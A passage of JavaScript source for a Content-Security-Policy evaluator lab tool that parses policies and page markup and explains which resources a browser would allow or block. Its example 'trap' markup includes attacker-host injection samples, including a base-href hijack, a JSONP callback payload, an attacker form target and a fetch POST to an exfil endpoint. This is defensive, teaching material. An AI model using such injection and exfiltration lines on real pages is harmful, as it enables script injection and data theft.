        } else if (EVENT_SET[an]) {
          inline('script-src-attr', an + '="" on <' + tag + '>', attrs[a].value);
        }
      }

      if (tag === 'script') {
        var type = trim(el.getAttribute('type') || '').toLowerCase();
        var nonce = el.getAttribute('nonce');
        var src = el.getAttribute('src');
        if (!JS_TYPES.hasOwnProperty(type)) {
          recs.push({
            dir: null, what: '<script type="' + type + '"> data block',
            raw: '(not executed)', ungoverned: true,
            note: 'A script element whose type is not a JavaScript type is a data ' +
                  'block. The browser never runs it, so CSP never checks it.'
          });
          continue;
        }
        if (src) {
          url('script-src-elem', '<script src>', src,
              { nonce: nonce, integrity: el.getAttribute('integrity') });
        } else {
          inline('script-src-elem', '<script> inline block', el.textContent,
                 { nonce: nonce });
          scanCode(el.textContent || '', function (dir, what, u) {
            url(dir, what, u);
          });
        }
      } else if (tag === 'style') {
        inline('style-src-elem', '<style> inline block', el.textContent,
               { nonce: el.getAttribute('nonce') });
        scanCss(el.textContent || '', function (dir, what, u) { url(dir, what, u); });
      } else if (tag === 'link') {
        var rel = trim(el.getAttribute('rel') || '').toLowerCase().split(/\s+/);
        var href = el.getAttribute('href');
        if (!href) continue;
        var relHas = function (name) { return rel.indexOf(name) >= 0; };
        if (relHas('stylesheet')) {
          url('style-src-elem', '<link rel=stylesheet>', href,
              { nonce: el.getAttribute('nonce'), integrity: el.getAttribute('integrity') });
        } else if (relHas('modulepreload')) {
          url('script-src-elem', '<link rel=modulepreload>', href,
              { nonce: el.getAttribute('nonce') });
        } else if (relHas('manifest')) {
          url('manifest-src', '<link rel=manifest>', href);
        } else if (relHas('icon') || relHas('apple-touch-icon')) {
          url('img-src', '<link rel=icon>', href);
        } else if (relHas('preload')) {
          var as = trim(el.getAttribute('as') || '').toLowerCase();
          var d = PRELOAD_AS[as];
          if (d) url(d, '<link rel=preload as=' + as + '>', href);
          else recs.push({ dir: null, what: '<link rel=preload>', raw: href, ungoverned: true,
            note: 'No as= attribute, so there is no destination and no directive to apply.' });
        } else if (relHas('prefetch')) {
          url('default-src', '<link rel=prefetch>', href,
              { note: 'prefetch-src was removed from the spec; prefetches fall back to default-src.' });
        } else if (relHas('preconnect') || relHas('dns-prefetch')) {
          recs.push({ dir: null, what: '<link rel=' + rel.join(' ') + '>', raw: href,
            ungoverned: true,
            note: 'A preconnect or DNS prefetch is not a resource fetch, so no CSP directive covers it.' });
        }
      } else if (tag === 'base') {
        var bh = el.getAttribute('href');
        if (bh) url('base-uri', '<base href>', bh, { isBase: true });
      } else if (tag === 'img') {
        if (el.getAttribute('src')) url('img-src', '<img src>', el.getAttribute('src'));
        if (el.getAttribute('srcset')) {
          srcsetUrls(el.getAttribute('srcset')).forEach(function (u) {
            url('img-src', '<img srcset>', u);
          });
        }
      } else if (tag === 'input') {
        if (trim(el.getAttribute('type') || '').toLowerCase() === 'image' &&
            el.getAttribute('src')) {
          url('img-src', '<input type=image src>', el.getAttribute('src'));
        }
      } else if (tag === 'iframe' || tag === 'frame') {
        if (el.getAttribute('src')) url('frame-src', '<' + tag + ' src>', el.getAttribute('src'));
        if (el.getAttribute('srcdoc')) {
          recs.push({ dir: null, what: '<iframe srcdoc>', raw: '(inline document)',
            ungoverned: true,
            note: 'A srcdoc frame inherits this page\'s policy rather than being fetched, ' +
                  'so frame-src does not apply to it.' });
        }
      } else if (tag === 'object') {
        if (el.getAttribute('data')) url('object-src', '<object data>', el.getAttribute('data'));
      } else if (tag === 'embed') {
        if (el.getAttribute('src')) url('object-src', '<embed src>', el.getAttribute('src'));
      } else if (tag === 'applet') {
        recs.push({ dir: 'object-src', what: '<applet>', raw: '(plugin)', ungoverned: true,
          note: 'Governed by object-src in the spec; no current browser loads applets at all.' });
      } else if (tag === 'video' || tag === 'audio' || tag === 'source' || tag === 'track') {
        if (el.getAttribute('src')) url('media-src', '<' + tag + ' src>', el.getAttribute('src'));
        if (tag === 'source' && el.getAttribute('srcset')) {
          srcsetUrls(el.getAttribute('srcset')).forEach(function (u) {
            url('img-src', '<source srcset>', u);
          });
        }
      } else if (tag === 'form') {
        if (el.getAttribute('action')) {
          url('form-action', '<form action>', el.getAttribute('action'));
        }
      } else if (tag === 'a' || tag === 'area') {
        if (el.getAttribute('ping')) {
          trim(el.getAttribute('ping')).split(/\s+/).filter(nonEmpty).forEach(function (u) {
            url('connect-src', '<' + tag + ' ping>', u);
          });
        }
      } else if (tag === 'meta') {
        var he = trim(el.getAttribute('http-equiv') || '').toLowerCase();
        if (he === 'content-security-policy' || he === 'content-security-policy-report-only') {
          notes.push('The markup contains a <meta http-equiv="' + he + '">. A meta ' +
            'policy is a SECOND policy on top of the header, and a resource must ' +
            'satisfy both. It also cannot use frame-ancestors, report-uri or sandbox — ' +
            'those are silently ignored in meta. Paste it into the policy box to test it.');
        } else if (he === 'refresh') {
          notes.push('The markup contains a <meta http-equiv="refresh">. CSP has no ' +
            'directive for top-level navigation, so no policy stops it.');
        }
      }
    }

    return { recs: recs, notes: notes, truncated: recs.length >= MAX_ROWS };
  }

  /* ======================================================================
     Hashing inline blocks
     ====================================================================== */

  function toBase64(buffer) {
    var bytes = new Uint8Array(buffer), s = '';
    for (var i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
    return btoa(s);
  }

  function hashInline(recs, algs, done) {
    var targets = recs.filter(function (r) { return r.inline !== undefined; });
    if (!targets.length) { done(true); return; }
    if (!window.crypto || !window.crypto.subtle || !window.TextEncoder ||
        !window.Promise) {
      done(false);
      return;
    }
    var enc = new TextEncoder();
    var jobs = [];
    targets.forEach(function (rec) {
      rec.hashes = {};
      algs.forEach(function (alg) {
        jobs.push(window.crypto.subtle.digest(WEB_ALG[alg], enc.encode(rec.inline))
          .then(function (buf) { rec.hashes[alg] = toBase64(buf); }));
      });
    });
    window.Promise.all(jobs).then(function () { done(true); },
                                  function () { done(false); });
  }

  /* ======================================================================
     Policy review — the things that are wrong before any markup is involved
     ====================================================================== */

  var CALLBACK_PARAM = /(^|&)(callback|jsonp|jsonpcallback|json_callback|cb|_callback)=/i;

  function reviewPolicy(set) {
    var items = [];
    function add(level, text) { items.push({ level: level, text: text }); }

    if (set.reportOnly) {
      add('err', 'This is a Content-Security-Policy-Report-Only header. It enforces ' +
        'nothing at all — it reports, and every verdict below would be a report ' +
        'rather than a block.');
    }
    if (set.split) {
      add('warn', 'A comma appears in the header, so this is ' + set.policies.length +
        ' separate policies, not one. A resource has to satisfy every one of them. ' +
        'If you meant a single policy, that comma should be a semicolon.');
    }

    set.policies.forEach(function (pol, pi) {
      var tag = set.policies.length > 1 ? 'policy ' + (pi + 1) + ': ' : '';
      var dirs = pol.dirs;

      pol.dupes.forEach(function (name) {
        add('warn', tag + name + ' appears more than once. Browsers keep the first ' +
          'occurrence and ignore the rest, so the later one is doing nothing.');
      });

      pol.order.forEach(function (name) {
        var dir = dirs[name];

        if (!KNOWN[name]) {
          var guess = nearestDirective(name);
          add('err', tag + 'unknown directive "' + name + '"' +
            (guess ? ' — did you mean ' + guess + '?' : '') +
            ' A browser ignores a directive name it does not recognise, silently ' +
            'and with no console error in most cases. Whatever you thought this ' +
            'was protecting is unprotected' +
            (dirs['default-src'] ? ', falling back to default-src if it is a fetch directive.' : '.'));
          return;
        }
        if (DEPRECATED[name]) {
          add('dim', tag + name + ': ' + DEPRECATED[name] + '.');
        }
        if (VALUELESS[name] && dir.tokens.length) {
          add('warn', tag + name + ' takes no source list; the ' + dir.tokens.length +
            ' token(s) after it are ignored.');
        }
        if (!VALUELESS[name] && !dir.tokens.length) {
          add('warn', tag + name + ' is present with no source expressions. An empty ' +
            "source list matches nothing, so this behaves exactly like 'none'. " +
            'That is usually a stray semicolon rather than an intention.');
        }

        if (NOT_SOURCE_LIST[name]) return;

        var srcs = dir.sources;
        var hasNonce = hasType(srcs, 'nonce');
        var hasHash = hasType(srcs, 'hash');
        var isScript = name.indexOf('script-src') === 0;
        var isStyle = name.indexOf('style-src') === 0;

        srcs.forEach(function (s) {
          if (s.type === 'bad-keyword') {
            add('err', tag + name + ': \'' + s.value + '\' is quoted like a keyword ' +
              'but is not one. The whole source expression is dropped.');
          }
          if (s.type === 'invalid') {
            add('err', tag + name + ': "' + s.raw + '" is not a valid source ' +
              'expression and will be discarded.');
          }
          if (s.type === 'host' && KNOWN[s.raw.toLowerCase()]) {
            add('err', tag + '"' + s.raw + '" is sitting inside ' + name +
              "'s source list, where it is read as a HOSTNAME. That is a missing " +
              'semicolon: ' + name + ' … ; ' + s.raw + ' …');
          }
          if (s.type === 'host' && KEYWORDS[s.raw.toLowerCase()]) {
            add('err', tag + name + ': ' + s.raw + ' is written without quotes, so it ' +
              "is parsed as a hostname. Keywords need single quotes: '" + s.raw + "'.");
          }
          if (s.type === 'nonce') {
            var decoded = 0;
            try { decoded = atob(s.value.replace(/-/g, '+').replace(/_/g, '/')).length; }
            catch (err) { decoded = -1; }
            if (decoded === -1) {
              add('warn', tag + name + ": the nonce '" + s.value +
                "' is not valid base64. Browsers still compare it as a string, so it " +
                'works, but it is a sign the nonce is a hand-typed constant.');
            } else if (decoded < 16) {
              add('warn', tag + name + ': the nonce decodes to ' + decoded +
                ' bytes. The spec asks for at least 128 bits (16 bytes) of ' +
                'randomness, generated fresh for every single response. A nonce ' +
                'that is the same on two page loads is not a nonce.');
            }
          }
        });

        if (isNoneList(srcs) === false && hasKeyword(srcs, 'none')) {
          add('err', tag + name + ": 'none' is listed alongside other sources. It is " +
            'only valid as the entire list, so here it is discarded and the other ' +
            'sources apply. This directive is not blocking anything.');
        }

        if (hasKeyword(srcs, 'unsafe-inline')) {
          if (hasNonce || hasHash) {
            add('warn', tag + name + ": 'unsafe-inline' is present AND " +
              (hasNonce ? 'a nonce' : 'a hash') + ' is present, so ' +
              "'unsafe-inline' is ignored entirely. Modern browsers obey the nonce. " +
              'Old ones that do not understand nonces obey \'unsafe-inline\' — which ' +
              'is the one case where writing both is deliberate.');
          } else if (isScript) {
            add('err', tag + name + " allows 'unsafe-inline' with no nonce and no " +
              'hash. Any script an attacker manages to inject into the markup runs. ' +
              'This is the single line that decides whether a CSP stops XSS.');
          } else if (isStyle) {
            add('warn', tag + name + " allows 'unsafe-inline'. For styles this is " +
              'common and much less severe than for scripts, but injected CSS can ' +
              'still read attribute values and leak them through selectors.');
          }
        }

        if (isScript && hasKeyword(srcs, 'unsafe-eval')) {
          add('warn', tag + name + " allows 'unsafe-eval', so eval, the Function " +
            'constructor and string setTimeout are all available to injected code.');
        }

        if (isScript && hasKeyword(srcs, 'strict-dynamic')) {
          var silenced = [];
          srcs.forEach(function (s) {
            if (s.type === 'host' || s.type === 'star' || s.type === 'scheme' ||
                (s.type === 'keyword' && s.value === 'self')) silenced.push(s.raw);
          });
          add('dim', tag + name + " carries 'strict-dynamic'. Every host and scheme " +
            'source in it is ignored' +
            (silenced.length ? ' — that is ' + silenced.join(', ') : '') +
            '. Only a nonce or a hash admits a script, and any script those admit ' +
            'can then insert further scripts of its own. The ignored sources are ' +
            'harmless: they are there for browsers too old to understand the keyword.');
        }

        if ((name === 'script-src' || name === 'script-src-elem' ||
             name === 'default-src' || name === 'object-src') &&
            !hasKeyword(srcs, 'strict-dynamic')) {
          srcs.forEach(function (s) {
            if (s.type === 'star') {
              add('err', tag + name + ' contains *, which permits every http, https, ' +
                'ws, wss and ftp origin. For a script directive that is the same as ' +
                'having no policy.');
            }
            if (s.type === 'scheme' && (s.value === 'https' || s.value === 'http')) {
              add('err', tag + name + ' contains ' + s.value + ':, which permits ' +
                'script from any host on that scheme. An attacker only needs one ' +
                'writable origin anywhere on the web.');
            }
            if (s.type === 'scheme' && s.value === 'data') {
              add('err', tag + name + ' contains data:, so an injected ' +
                '<script src="data:text/javascript,…"> loads. This is a complete ' +
                'bypass and there is almost never a reason for it.');
            }
          });
        }

        if (isScript && hasKeyword(srcs, 'self') && !hasKeyword(srcs, 'strict-dynamic')) {
          add('dim', tag + name + " includes 'self', which permits any script served " +
            'from your own origin. That includes a JSONP or callback endpoint that ' +
            'reflects a name you choose, an open redirect, and anything a user can ' +
            "upload to your host. 'self' is only as strong as the weakest file on it.");
        }
      });

      /* The absences. These matter more than anything present, because there is
         nothing on screen to review. */
      if (!dirs['default-src']) {
        add('warn', tag + 'no default-src. Every fetch directive you did not name is ' +
          'unrestricted — img-src, connect-src, font-src, media-src and the rest.');
      }
      if (!dirs['base-uri']) {
        add('err', tag + 'no base-uri. An injected <base href="https://attacker/"> ' +
          're-points every relative URL on the page, so a nonced <script src="app.js"> ' +
          'loads the attacker\'s app.js and carries your nonce with it. base-uri is ' +
          "not covered by default-src, so this is a gap you have to close by hand.");
      }
      if (!dirs['form-action']) {
        add('warn', tag + 'no form-action. An injected form can post the page\'s ' +
          'contents anywhere, and connect-src will not stop it. Not covered by ' +
          'default-src either.');
      }
      if (!dirs['frame-ancestors']) {
        add('warn', tag + 'no frame-ancestors. Whether this page can be framed is ' +
          'being decided by an X-Frame-Options header, or by nothing at all. Not ' +
          'covered by default-src.');
      }
      var obj = effective(pol, 'object-src');
      if (!obj.dir) {
        add('warn', tag + 'nothing covers object-src, so <object> and <embed> are ' +
          "unrestricted. object-src 'none' costs nothing on a modern site.");
      } else if (!isNoneList(obj.dir.sources)) {
        add('dim', tag + 'object-src resolves to ' + obj.name + ' (' +
          obj.dir.tokens.join(' ') + "). object-src 'none' is the recommendation; " +
          'plugin content is a script-execution path.');
      }
      if (!dirs['report-uri'] && !dirs['report-to']) {
        add('dim', tag + 'no report-uri and no report-to. Violations will be blocked ' +
          'in silence and you will not hear about them.');
      }
      if (dirs['upgrade-insecure-requests']) {
        add('ok', tag + 'upgrade-insecure-requests is set, so http:// subresource ' +
          'URLs are rewritten to https:// before the policy is even applied.');
      }
    });

    return items;
  }

  /* ======================================================================
     Rendering
     ====================================================================== */

  function levelClass(level) {
    if (level === 'err') return 't-err';
    if (level === 'warn') return 't-warn';
    if (level === 'ok') return 't-ok';
    return 't-dim';
  }

  /* Soft-wrap a sentence into the terminal pane at a fixed column.

     The pane is white-space: pre-wrap, so it would wrap on its own — but it
     wraps to the pane width, which flush-lefts the continuation under the
     ALLOWED/BLOCKED column and makes a long explanation unreadable next to a
     list of verdicts. Wrapping here keeps the hanging indent.

     The first argument prefixes line one, the second every line after it. An
     earlier version took a single indent and folded it into the text, which
     the whitespace split promptly ate — every explanation came out flush
     left, under the verdict column, unreadable. */
  function emitWrapped(text, cls, width, first, rest) {
    var words = trim(text).split(/\s+/).filter(nonEmpty);
    var lines = [], line = '', started = false;
    words.forEach(function (w) {
      if (!started) { line = first + w; started = true; return; }
      if ((line + ' ' + w).length > width) { lines.push(line); line = rest + w; }
      else { line += ' ' + w; }
    });
    if (started) lines.push(line);
    lines.forEach(function (l) { out.line(l, cls); });
  }

  function render(state) {
    var set = state.set;
    var self = state.self;
    out.clear();

    out.heading('POLICY');
    out.row('page URL', self.href);
    out.row('origin', self.scheme + '://' + self.host +
      (self.port ? ':' + self.port : ''));
    out.row('policies in header', set.policies.length);
    var totalDirs = 0, unknown = 0;
    set.policies.forEach(function (p) {
      totalDirs += p.order.length;
      p.order.forEach(function (n) { if (!KNOWN[n]) unknown++; });
    });
    out.row('directives parsed', totalDirs);
    out.row('unknown directives', unknown, unknown ? 't-err' : 't-ok');
    if (set.reportOnly) out.row('mode', 'REPORT-ONLY, nothing is enforced', 't-err');

    if (state.presetNotes) {
      out.line('');
      out.heading('WHAT THIS POLICY IS FOR');
      out.dim(state.presetTitle);
      out.line('');
      state.presetNotes.forEach(function (l) { out.dim(l); });
    }

    out.rule();
    out.heading('DIRECTIVES AS A BROWSER READS THEM');
    set.policies.forEach(function (pol, pi) {
      if (set.policies.length > 1) out.dim('-- policy ' + (pi + 1));
      if (!pol.order.length) { out.warn('(empty policy — it restricts nothing)'); return; }
      pol.order.forEach(function (name) {
        var dir = pol.dirs[name];
        var cls = KNOWN[name] ? null : 't-err';
        var value = dir.tokens.length ? dir.tokens.join(' ') : '(no sources)';
        out.row(name, value, cls);
      });
    });

    out.rule();
    out.heading('POLICY REVIEW');
    if (!state.review.length) {
      out.ok('Nothing to flag in the policy itself.');
    } else {
      var order = { err: 0, warn: 1, ok: 2, dim: 3 };
      var sorted = state.review.slice().sort(function (a, b) {
        return order[a.level] - order[b.level];
      });
      sorted.forEach(function (item) {
        var mark = item.level === 'err' ? '[!] ' :
                   item.level === 'warn' ? '[?] ' :
                   item.level === 'ok' ? '[+] ' : '[ ] ';
        emitWrapped(item.text, levelClass(item.level), 76, mark, '    ');
      });
    }

    if (state.collected && state.collected.notes.length) {
      out.line('');
      state.collected.notes.forEach(function (t) {
        emitWrapped(t, 't-warn', 76, '[?] ', '    ');
      });
    }

    if (!state.collected) {
      out.rule();
      out.dim('No markup pasted, so nothing was evaluated against the policy.');
      out.dim('Paste a page into the lower box to see resource-by-resource verdicts.');
      limits(state);
      return;
    }

    out.rule();
    out.heading('WHAT THE MARKUP WOULD LOAD');
    if (state.baseNote) {
      state.baseNote.forEach(function (l) { out.warn(l); });
      out.line('');
    }
    if (!state.rows.length) {
      out.dim('No resources found in that markup.');
    }

    var allowed = 0, blocked = 0, ungoverned = 0;
    state.rows.forEach(function (row, i) {
      var rec = row.rec, v = row.verdict;
      if (rec.ungoverned) {
        ungoverned++;
        out.write(pad(String(i + 1), 4), 't-dim');
        out.write(pad('NOT CSP', 10), 't-dim');
        out.line(rec.what + '  ' + (rec.raw || ''));
        if (rec.note) emitWrapped(rec.note, 't-dim', 76, '      ', '      ');
        return;
      }
      if (v.allowed) allowed++; else blocked++;
      out.write(pad(String(i + 1), 4), 't-dim');
      out.write(pad(v.allowed ? 'ALLOWED' : 'BLOCKED', 10),
                v.allowed ? 't-ok' : 't-err');
      out.line(rec.what + '  ' + row.target);

      var lead = '      ';
      var dirLabel = v.dirName || '(no directive)';
      if (set.policies.length > 1) dirLabel = 'policy ' + v.policyIndex + '  ' + dirLabel;
      out.line(lead + dirLabel, 't-dim');
      emitWrapped(v.why, 't-dim', 76, lead, lead + '  ');
      if (row.extra) {
        row.extra.forEach(function (line) {
          emitWrapped(line.text, levelClass(line.level), 76, lead, lead + '  ');
        });
      }
    });

    if (state.collected.truncated) {
      out.line('');
      out.warn('Stopped at ' + MAX_ROWS + ' resources. That is a cap on this tool, ' +
        'not on the browser.');
    }

    out.rule();
    out.heading('SUMMARY');
    out.row('allowed', allowed, allowed ? 't-ok' : null);
    out.row('blocked', blocked, blocked ? 't-err' : null);
    out.row('not governed by CSP', ungoverned);
    if (set.reportOnly) {
      out.line('');
      out.err('Report-only: none of those blocks would actually happen. The header ' +
        'reports and allows.');
    }
    limits(state);
  }

  function limits(state) {
    out.rule();
    out.heading('WHAT THIS DOES NOT DO');
    out.dim('It reads markup. A resource a script requests after the page loads is');
    out.dim('invisible here, except for literal URLs passed to fetch, XHR, WebSocket,');
    out.dim('EventSource, sendBeacon, Worker and import() — a text scan, so a URL');
    out.dim('assembled from variables is not found.');
    out.dim('');
    out.dim('It does not follow redirects. Real CSP drops path matching after a');
    out.dim('redirect, so a policy with a path in it is weaker in practice than here.');
    out.dim('');
    out.dim('It implements the source-matching rules that decide real policies:');
    out.dim('scheme, host with a leading wildcard, port, path prefix, \'self\', scheme');
    out.dim('sources, nonces, hashes, \'strict-dynamic\' and the default-src fallback');
    out.dim('chain. It has no model of sandbox, trusted-types, require-trusted-types-for');
    out.dim('or report grouping, and it makes no attempt at exotic URL schemes.');
    out.dim('');
    if (state && state.hashFailed) {
      out.warn('Hashes of inline blocks could not be computed in this context');
      out.warn('(crypto.subtle needs a secure origin), so hash sources were not matched.');
      out.dim('');
    }
    out.dim('ALLOWED means the policy permits the request. It does not mean the');
    out.dim('request is safe. Nothing was fetched and nothing left this tab.');
  }

  /* ======================================================================
     Evaluate
     ====================================================================== */

  function el(id) { return document.getElementById(id); }

  function setStatus(text, cls) {
    var node = el('csp-status');
    if (!node) return;
    node.textContent = text;
    node.className = 'lab-status' + (cls ? ' ' + cls : '');
  }

  function targetOf(rec) {
    if (rec.inline !== undefined) {
      /* The first line of a <script> block written across several lines is the
         newline straight after the tag, so taking line one literally labelled
         every multi-line script "(empty)" — including the one carrying the
         exfiltration call, which is the row a reader most wants to find. */
      var lines = String(rec.inline).split('\n');
      var first = '';
      for (var i = 0; i < lines.length; i++) {
        first = trim(lines[i]);
        if (first) break;
      }
      if (first.length > 58) first = first.slice(0, 57) + '…';
      return first ? '"' + first + '"' : '(empty)';
    }
    if (rec.url && rec.url.ok) return rec.url.href;
    return rec.raw;
  }

  function evaluate() {
    var policyText = el('tool-in').value;
    var htmlText = el('csp-html').value;
    var pageUrlText = trim(el('csp-url').value) || 'https://example.com/';

    if (policyText.length > MAX_POLICY) {
      out.clear().err('That policy is ' + LabTool.humanBytes(policyText.length) +
        '. This tool stops at ' + LabTool.humanBytes(MAX_POLICY) + '.');
      return;
    }
    if (htmlText.length > MAX_HTML) {
      out.clear().err('That markup is ' + LabTool.humanBytes(htmlText.length) +
        '. This tool stops at ' + LabTool.humanBytes(MAX_HTML) +
        ' so the page stays responsive — the work happens in this tab.');
      return;
    }

    var selfUrl = parseUrl(pageUrlText);
    if (!selfUrl.ok || !selfUrl.host) {
      out.clear();
      out.err('"' + pageUrlText + '" is not a URL this tool can read.');
      out.dim('It needs a full absolute URL, because \'self\' means the origin of the');
      out.dim('page the policy is delivered with. Try https://example.com/page.');
      return;
    }

    if (!trim(policyText)) {
      out.clear();
      out.warn('No policy yet.');
      out.dim('Paste a Content-Security-Policy header value into the upper box, or');
      out.dim('pick one of this site\'s four from the dropdown, then press Evaluate.');
      return;
    }

    var set = parsePolicySet(policyText);
    if (!set.policies.length) {
      out.clear().err('Nothing in that text parsed as a directive.');
      return;
    }
    var review = reviewPolicy(set);

    var state = {
      set: set, self: selfUrl, review: review,
      collected: null, rows: [], baseNote: null,
      presetTitle: currentPresetTitle,
      presetNotes: policyText === currentPresetSource ? currentPresetNotes : null
    };

    if (!trim(htmlText)) { render(state); return; }

    var doc;
    try {
      doc = new DOMParser().parseFromString(htmlText, 'text/html');
    } catch (err) {
      out.clear().err('That markup could not be parsed: ' + (err && err.message));
      return;
    }

    /* The base tag, first and on its own, because it changes how every other
       URL on the page resolves. Deciding it before anything else is not tidiness
       — it is the actual order the browser works in, and it is the reason
       base-uri deserves its own directive. */
    var resolveBase = selfUrl.href;
    var baseEl = doc.querySelector('base[href]');
    if (baseEl) {
      var baseHref = baseEl.getAttribute('href');
      var baseUrl = parseUrl(baseHref, selfUrl.href);
      var bv = decide(set.policies, function (pol) {
        return checkUrl(pol, 'base-uri', baseUrl, selfUrl, {});
      });
      if (bv.allowed && baseUrl.ok) {
        resolveBase = baseUrl.href;
        state.baseNote = [
          'A <base href="' + baseHref + '"> is present and the policy ALLOWS it.',
          'Every relative URL below now resolves against ' + baseUrl.href,
          'instead of the page. If an attacker can inject one tag into your page,',
          'this is the tag: it moves your own relative script srcs to their host,',
          'nonce and all.'
        ];
      } else {
        state.baseNote = [
          'A <base href="' + baseHref + '"> is present and the policy BLOCKS it (' +
            (bv.dirName || 'the policy') + ').',
          'The tag is ignored, so relative URLs below resolve against the page URL.',
          'This is base-uri earning its place.'
        ];
      }
    }

    var collected = collect(doc, resolveBase);
    state.collected = collected;

    // Which hash algorithms does the policy actually reference? Always compute
    // sha256 as well, so the report can offer the line you would need to add.
    var algs = { sha256: 1 };
    set.policies.forEach(function (pol) {
      pol.order.forEach(function (n) {
        pol.dirs[n].sources.forEach(function (s) {
          if (s.type === 'hash' && WEB_ALG[s.alg]) algs[s.alg] = 1;
        });
      });
    });
    var algList = Object.keys(algs);

    setStatus('reading markup…', 'is-busy');
    hashInline(collected.recs, algList, function (ok) {
      state.hashFailed = !ok;
      try {
        buildRows(state);
        render(state);
        setStatus(summaryText(state), 'is-ok');
      } catch (err) {
        out.rule();
        out.err('Something in that markup broke the evaluator part way through.');
        out.dim('Whatever printed above is still valid. Details: ' +
          ((err && err.message) || String(err)));
        setStatus('failed part way', 'is-err');
      }
    });
  }

  function summaryText(state) {
    var a = 0, b = 0;
    state.rows.forEach(function (r) {
      if (r.rec.ungoverned) return;
      if (r.verdict.allowed) a++; else b++;
    });
    return a + ' allowed, ' + b + ' blocked';
  }

  function buildRows(state) {
    var set = state.set, self = state.self;
    state.rows = state.collected.recs.map(function (rec) {
      if (rec.ungoverned) return { rec: rec, verdict: { allowed: true }, target: rec.raw };

      var v, target;
      if (rec.inline !== undefined) {
        v = decide(set.policies, function (pol) {
          return checkInline(pol, rec.dir, { nonce: rec.nonce, hashes: rec.hashes });
        });
        target = targetOf(rec);
      } else {
        v = decide(set.policies, function (pol) {
          return checkUrl(pol, rec.dir, rec.url, self,
            { nonce: rec.nonce, integrity: rec.integrity });
        });
        target = targetOf(rec);
      }

      var extra = [];

      /* The JSONP problem, demonstrated rather than asserted: a same-origin
         script URL that carries a callback parameter is allowed by 'self' and
         hands the attacker arbitrary script execution on your page. This is
         why "script-src 'self'" is not, by itself, an XSS defence. */
      if (v.allowed && rec.dir === 'script-src-elem' && rec.url && rec.url.ok &&
          rec.url.host === self.host && CALLBACK_PARAM.test(rec.url.search.slice(1))) {
        extra.push({ level: 'err', text:
          'This is on YOUR OWN origin and carries a callback parameter. ' +
          "'self' permits it without looking at the query string. If that endpoint " +
          'reflects the callback name into a JavaScript response — which is what ' +
          'JSONP is — then an attacker who can inject one script tag gets arbitrary ' +
          "execution, and script-src 'self' allowed it. Every callback endpoint on " +
          "your origin is a hole in 'self'." });
      }

      if (rec.dir === 'script-src-attr' && !v.allowed) {
        extra.push({ level: 'dim', text:
          'A nonce cannot rescue this one: there is nowhere to put a nonce on an ' +
          "attribute. It needs 'unsafe-inline', or 'unsafe-hashes' plus the hash of " +
          'the attribute value.' });
      }

      if (rec.nonce !== undefined && rec.nonce !== null && rec.nonce !== '' && !v.allowed) {
        extra.push({ level: 'dim', text:
          'The element carries nonce="' + rec.nonce + '" but no directive that ' +
          'applies to it lists that value.' });
      }

      if (!v.allowed && rec.inline !== undefined && rec.hashes && rec.hashes.sha256) {
        extra.push({ level: 'dim', text:
          "To allow exactly this block and nothing else, add 'sha256-" +
          rec.hashes.sha256 + "' to " + (v.dirName || rec.dir) +
          '. The hash covers the content byte for byte, so any edit invalidates it.' });
      }

      if (rec.note) extra.push({ level: 'dim', text: rec.note });

      return { rec: rec, verdict: v, target: target, extra: extra.length ? extra : null };
    });
  }

  /* ======================================================================
     Examples
     ====================================================================== */

  /* The explanation printed above the verdicts belongs to a preset, not to
     whatever is in the box now. Keeping the preset's exact text lets evaluate()
     drop the explanation the moment somebody edits a character, rather than
     narrating one policy while grading another. */
  var currentPresetTitle = null;
  var currentPresetNotes = null;
  var currentPresetSource = null;

  var ORDINARY_MARKUP = [
    '<!doctype html>',
    '<html lang="en">',
    '<head>',
    '  <link rel="stylesheet" href="/assets/css/main.css">',
    '  <script src="/assets/js/boot.js"></script>',
    '  <script defer src="/assets/js/theme.js"></script>',
    '  <script type="application/ld+json">{"@type":"WebSite"}</script>',
    '  <script async src="https://www.googletagmanager.com/gtag/js?id=G-EXAMPLE"></script>',
    '  <script>window.dataLayer=window.dataLayer||[];gtag("js",new Date());</script>',
    '  <link rel="icon" href="/favicon.svg" type="image/svg+xml">',
    '  <link rel="manifest" href="/site.webmanifest">',
    '  <link rel="preload" href="/assets/fonts/code.woff2" as="font" crossorigin>',
    '</head>',
    '<body>',
    '  <img src="/assets/images/og-lab-exif.jpg" alt="">',
    '  <img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" alt="">',
    '  <form action="/labs" method="get"><input name="q"></form>',
    '  <div style="--accent:1">styled by attribute</div>',
    '  <script>new Worker("/assets/js/labs/worker.js");</script>',
    '</body>',
    '</html>'
  ].join('\n');

  var TRAP_POLICY = "default-src 'self'; script-src 'self' 'unsafe-inline' " +
    "'nonce-deadbeefdeadbeef' https://cdn.example.com; style-src 'self' " +
    "'unsafe-inline'; img-src *; frame-src https:; object-scr 'none'; " +
    'report-uri /csp-report';

  var TRAP_MARKUP = [
    '<!doctype html>',
    '<html>',
    '<head>',
    '  <base href="https://cdn.attacker.example/">',
    '  <script src="app.js"></script>',
    '  <script src="https://shop.example.com/api/echo?callback=alert(1)"></script>',
    '  <script nonce="deadbeefdeadbeef">console.log("nonced");</script>',
    '  <script>console.log("plain inline");</script>',
    '  <script type="application/ld+json">{"@type":"Thing"}</script>',
    '  <link rel="stylesheet" href="https://fonts.example.net/x.css">',
    '  <style>@font-face{font-family:X;src:url(https://fonts.example.net/x.woff2)}',
    '  .a{background:url(https://cdn.attacker.example/pixel.gif?c=1)}</style>',
    '</head>',
    '<body onload="init()">',
    '  <img src="/logo.png" alt="">',
    '  <img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" alt="">',
    '  <img src="https://tracker.example.net/p.gif?u=1" alt="">',
    '  <div style="background:url(https://cdn.attacker.example/leak.png)">x</div>',
    '  <button onclick="alert(1)">click</button>',
    '  <form action="https://cdn.attacker.example/collect" method="post">',
    '    <input name="q"></form>',
    '  <iframe src="https://ads.example.net/frame.html"></iframe>',
    '  <object data="/legacy.swf"></object>',
    '  <a href="/x" ping="https://tracker.example.net/ping">x</a>',
    '  <script>',
    /* Split across a concatenation on purpose. This is inert example text
       destined for a textarea, but written whole it would read as a real
       network call to anything grepping this repository for one, and the
       promise that no lab file touches the network is worth keeping
       greppable. */
    '    ' + 'fetch' + '("https://cdn.attacker.example/exfil", {method:"POST"});',
    '    new WebSocket("wss://cdn.attacker.example/ws");',
    '  </script>',
    '</body>',
    '</html>'
  ].join('\n');

  var STRICT_POLICY = "script-src 'nonce-Nc3n83cnSAd3wc3Sasd/aQ==' 'strict-dynamic' " +
